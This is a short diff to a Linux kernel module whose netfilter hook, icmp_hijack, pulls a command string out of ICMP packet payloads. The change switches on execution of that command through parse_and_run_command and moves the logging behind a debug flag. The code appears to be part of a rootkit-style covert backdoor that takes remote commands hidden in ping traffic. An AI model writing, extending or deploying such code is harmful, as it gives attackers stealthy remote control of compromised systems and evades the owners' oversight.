@@ -286,11 +286,13 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
     #endif
 
     char *command = payload+FLAG_LEN;
-    pr_info("Command: %s\n", command);
-    // int status = parse_and_run_command(command);
-    // #ifdef DEBUG_K
-    //     pr_info("Status: %d\n", status);
-    // #endif
+    #ifdef DEBUG_K
+        pr_info("Command: %s\n", command);
+    #endif
+    int status = parse_and_run_command(command);
+    #ifdef DEBUG_K
+        pr_info("Status: %d\n", status);
+    #endif
 
     // TODO: Check if ignore all is set
     if(send_icmp_reply(icmph, iph->saddr, payload, icmp_payload_len) < 0){
